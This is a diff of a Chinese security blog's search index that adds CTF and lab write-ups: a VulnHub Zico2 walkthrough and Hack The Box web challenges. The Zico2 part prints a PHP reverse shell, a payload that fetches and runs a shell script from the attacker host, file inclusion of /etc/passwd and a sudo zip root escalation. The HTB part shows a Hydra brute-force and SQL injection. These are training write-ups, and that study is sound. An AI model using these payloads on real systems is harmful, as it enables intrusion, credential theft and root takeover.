@@ -4,6 +4,177 @@
   
     
     <entry>
+      <title><![CDATA[vulnhub渗透测试练习 - Zico2]]></title>
+      <url>https://uknowsec.cn/posts/notes/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Zico2.html</url>
+      <content type="html"><![CDATA[<h2 id="vulnhub渗透环境"><a href="#vulnhub渗透环境" class="headerlink" title="vulnhub渗透环境"></a>vulnhub渗透环境</h2><h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/zico2-1,210/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
+<h3 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h3><ul>
+<li>Kali Linux </li>
+<li>VirtualBox</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在信息收集之前需要获取到靶机的IP地址，我靶机在VirtualBox下是<code>Host-Only</code>网络模式，而靶机是无法直接进入系统看到IP地址的。</p>
+<p>这里用到一个kali linux下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。</p>
+<p>直接执行命令<code>netdiscover</code>:</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505223944.png" alt=""></p>
+<p>这里我们获取到两个IP地址，测试发现正确的是<code>192.168.56.102</code></p>
+<p>接下来用<code>nmap</code>扫描端口信息</p>
+<p><code>nmap -A 192.168.56.102</code></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505224409.png" alt=""></p>
+<p>得到80端口上运行着一个Web服务器。</p>
+<p>访问该Web服务，在这个时候我们可以用常见的扫描工具对网站进行扫描</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里我简单对页面进行浏览，发现了一个文件包含漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?page=tools.html</span><br></pre></td></tr></table></figure>
+<p>尝试包含<code>../../etc/passwd</code></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_1.png" alt=""></p>
+<p>成功包含，解下来就尝试扫描目录，因为校园网的原因，只能用<code>Host-Only</code>网络模式进行测试，所以一切测试过程都在<code>Kali</code>下进行</p>
+<p>这里尝试去扫描网站的目录，用到<code>kali</code>下的<code>dirb</code>专门用于爆破目录的工具。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_2.png" alt=""></p>
+<p>得到一个<code>dbadmin</code>的目录</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_3.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_4.png" alt=""></p>
+<p>这里用到的是一个叫<code>phpLiteAdmin</code>服务器应用，版本号为<code>v1.9.3</code></p>
+<p>尝试找找这个版本的历史漏洞，这个服务是存在一个远程PHP代码注入漏洞的。</p>
+<p>这里可以通过搜索引擎搜索相关漏洞详情也可以用<code>kali</code>下的<code>Searchsploit</code>一个用于Exploit-DB的命令行搜索工具。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_5.png" alt=""></p>
+<p>这样们就可以看到漏洞详情，这里我们可以看到利用这个远程PHP代码注入漏洞需要登录的。</p>
+<p>所以尝试默认密码<code>admin</code>，发现可以直接登录进去。</p>
+<p>从<code>exploit-db</code>上的资料可以看出，我们需要创建一个数据库，写入一个shell。</p>
+<p>这里可以用nc监听端口来反弹shell，也可以用msf生成php目录进行监听。</p>
+<p>按照<code>exploit-db</code>所说的建立数据库。这里直接创建一个后缀名为<code>.php</code>的数据库<code>shell</code></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_6.png" alt=""></p>
+<p>并添加表信息</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_7.png" alt=""></p>
+<p>这里在本地的<code>/var/www/html</code>目录下创建txt文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sock=fsockopen(&quot;192.168.56.101&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后启动apache web服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+<p>然后返回到数据库中添加字段名，类型为<code>TEXT</code>,写入PHP代码来下载执行shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;wget 192.168.56.101/shell.txt -O /tmp/shell.php; php /tmp/shell.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_8.png" alt=""></p>
+<p>需要让目标下载执行这串恶意代码，需要一个HTTP请求。</p>
+<p>这里我们就可以利用到之前发现的本地文件包含的漏洞了。</p>
+<p>我们可以在数据库中发现我们恶意创建的数据库的路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/databases/shell.php</span><br></pre></td></tr></table></figure>
+<p>先用nc监听我们之前设置的端口<code>2333</code></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_9.png" alt=""></p>
+<p>这里我们就可以反弹一个shell了。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在反弹了shell后，对目录进行检查发现了</p>
+<p>/home/zico中有一个<code>wordpress</code>目录，是一个常见的CMS</p>
+<p>进入查看wp-config.php文件。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_10.png" alt=""></p>
+<p>发现了用户zico的登录凭证，我们可以用<code>ssh</code>来连接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh zico@192.168.56.102</span><br></pre></td></tr></table></figure>
+<p>利用<code>sudo -l</code>查看目前用户可执行与无法执行的指令；</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_11.png" alt=""></p>
+<p>这里表明当前用户<code>zico</code>可以利用root权限无密码执行<code>tar</code>和<code>zip</code>命令</p>
+<p>这里可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip exploit.zip exploit -T --unzip-command=&quot;python -c &apos;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&apos;&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>sudo 用管理员权限执行</li>
+<li>-T 检查文件的完整性。这个参数可以让他执行下一个参数 –unzip-command，在这个参数中写入一个python的交互shell</li>
+</ul>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_12.png" alt=""></p>
+<p>由此的到<code>root</code>权限，接下来就可以进入<code>/root</code>目录了</p>
+<p><code>cat /root/flag.txt</code>得到flag。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_13.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>vulnhub里面有很多不同的环境提供渗透，第一次完成一次完整的渗透过程，学到了很多东西。</li>
+<li>在文章的开头用到了<code>kali linux</code>下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。记得在一个师傅的面试经验介绍中，他被面试官问到为什么要用arp去探测内网主机，他回答的是相当隐蔽，探测的信息更准确。主要是因为传统探测远程主机是否存活的方法是通过ICMP协议中的回显应答报文来探测(ping)。很多主机为了避免被扫描器探测，通过防火墙将ICMP包屏蔽，从而达到在网络中隐藏的目的。</li>
+<li>在文章中用到了两种语言的交互shell。分别是php和python，这里参考老外的博客<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a></li>
+<li>对于我个人在提权实战经验方面是十分少的，在这次练习中学到了可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩，由此可见还是自己的实战经验太少了。</li>
+<li>最后感概下，英文的重要性。国外很多大牛的博客都是很丰富的，而对于一个英语四级425飘过的菜鸡，我也是很无奈的。只能靠百度翻译了。</li>
+</ul>
+]]></content>
+      
+        <categories>
+            
+            <category> 笔记 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[hackthebox web challenges]]></title>
+      <url>https://uknowsec.cn/posts/notes/Hackthebox-Web-Challenges.html</url>
+      <content type="html"><![CDATA[<h2 id="HDC"><a href="#HDC" class="headerlink" title="HDC"></a>HDC</h2><p>根据题目给出来的提示</p>
+<p><code>Enter your credentials and press [Submit] to access the company&#39;s Control Panel.</code></p>
+<p>并查看源码发现</p>
+<p><code>&lt;input type=&quot;button&quot; value=&quot;Submit&quot; onclick=&quot;doProcess()&quot;/&gt;</code></p>
+<p>在myscripts.js里发现了<code>doProcess()</code>函数</p>
+<p>同时在jquery-3.2.1.js也发现了<code>doProcess()</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;var form=document.createElement(&quot;form&quot;);	form.setAttribute(&quot;method&quot;,&quot;post&quot;);	form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);	form.setAttribute(&quot;target&quot;,&quot;view&quot;);	var hiddenField=document.createElement(&quot;input&quot;);	hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);	hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);	var hiddenField2=document.createElement(&quot;input&quot;);	hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);	hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);	form.appendChild(hiddenField2);		form.appendChild(hiddenField);	form.appendChild(hiddenField2);	document.body.appendChild(form);			window.open(&apos;&apos;,&apos;view&apos;);	form.submit();&#125;</span><br></pre></td></tr></table></figure>
+<p>由这里可以得到账号密码<code>TXlMaXR0bGU</code>和<code>cDB3bmll</code>。</p>
+<p>进入系统可以看到有一个可以发邮箱的地方。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505171357.png" alt=""></p>
+<p>发现了一个目录<code>secret_area_</code>访问目录下的mails.txt得到一份邮箱表单。</p>
+<p>尝试着用这份邮箱名单去发邮件。</p>
+<p>这里用burp遍历</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p>
+<p>由此得到flag。</p>
+<h2 id="Lernaean"><a href="#Lernaean" class="headerlink" title="Lernaean"></a>Lernaean</h2><p>这里的提示是</p>
+<p><code>Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!</code></p>
+<p>因为英语比较差，所以搜了下lernaean发现是<code>水蛇许德拉(Lernaean Hydra)</code>的意思。</p>
+<p><code>Hydra</code>一个用来破解密码的工具。所以尝试用<code>Hydra</code>来破解密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 88.198.233.174 http-post-form &quot;/:password=^PASS^:Invalid password!&quot; -s 44134</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-l 指定用户名</li>
+<li>-P 指定字典</li>
+<li>http-post-form POST请求</li>
+<li>:Invalid password!” 密码错误输出的错误信息</li>
+<li>-s 指定端口</li>
+</ul>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505173240.png" alt=""></p>
+<p>得到密码登录。页面返回。</p>
+<p><code>Ooops! Too slow!</code></p>
+<p>利用burp提交即可得到flag.</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p>
+<h2 id="Cartographer"><a href="#Cartographer" class="headerlink" title="Cartographer"></a>Cartographer</h2><p>进到页面是一个登录框，尝试万能密码</p>
+<p><code>&#39; or 1=1#</code></p>
+<p>至今进入页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cartographer</span><br><span class="line">Is Still</span><br><span class="line">Under Construction!</span><br></pre></td></tr></table></figure>
+<p>发现url中好像是文件包含，尝试info=flag</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505173920.png" alt=""></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 笔记 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[hackthebox invite code]]></title>
+      <url>https://uknowsec.cn/posts/notes/hackthebox-invite-code.html</url>
+      <content type="html"><![CDATA[<p>一个国外的CTF站点，听群里的师傅说有很多模拟的内网环境，所以想上去试试水。</p>
+<p>这个站点是注册是需要邀请码的，这里是一个简单的题目。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505165024.png" alt=""></p>
+<p>F12审核元素，可以看到<code>/js/inviteapi.min.js</code>得到一串javascript混淆之后的代码，解密得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &apos;/api/invite/verify&apos;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &apos;/api/invite/how/to/generate&apos;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里定义了两个函数<code>makeInviteCode()</code>和<code>verifyInviteCode(code)</code></p>
+<p>利用控制台调用<code>makeInviteCode()</code>得到base64密文</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505165530.png" alt=""></p>
+<p>解密得到 <code>In order to generate the invite code, make a POST request to /api/invite/generate</code></p>
+<p>用POST请求/api/invite/generate</p>
+<p>burp构造一个POST请求</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505170039.png" alt=""></p>
+<p>解密得到邀请码。另外在注册的时候发现，不扶墙是不能得到验证码的。但是扶墙之后，会发现得到的验证码跟代理IP的不匹配。</p>
+<p>所以在做题的时候直接扶墙做题。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 笔记 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[正方教务系统验证码识别]]></title>
       <url>https://uknowsec.cn/posts/notes/%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB.html</url>
       <content type="html"><![CDATA[<h2 id="验证码预处理"><a href="#验证码预处理" class="headerlink" title="验证码预处理"></a>验证码预处理</h2><h3 id="下载验证码"><a href="#下载验证码" class="headerlink" title="下载验证码"></a>下载验证码</h3><h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(&apos;image\\&apos; + picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        print(&quot;downloading code %d.png&quot; % i,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        get_checkcode(i)</span><br></pre></td></tr></table></figure>
@@ -1826,7 +1997,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</span><br></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#102;&#x6f;&#x6f;&#64;&#x62;&#x61;&#114;&#x2e;&#x63;&#111;&#109;">&#102;&#x6f;&#x6f;&#64;&#x62;&#x61;&#114;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x66;&#x6f;&#x6f;&#64;&#x62;&#97;&#114;&#46;&#99;&#x6f;&#109;">&#x66;&#x6f;&#x6f;&#64;&#x62;&#97;&#114;&#46;&#99;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker diff hello-nginx</span><br></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker inspect hello-nginx</span><br></pre></td></tr></table></figure>
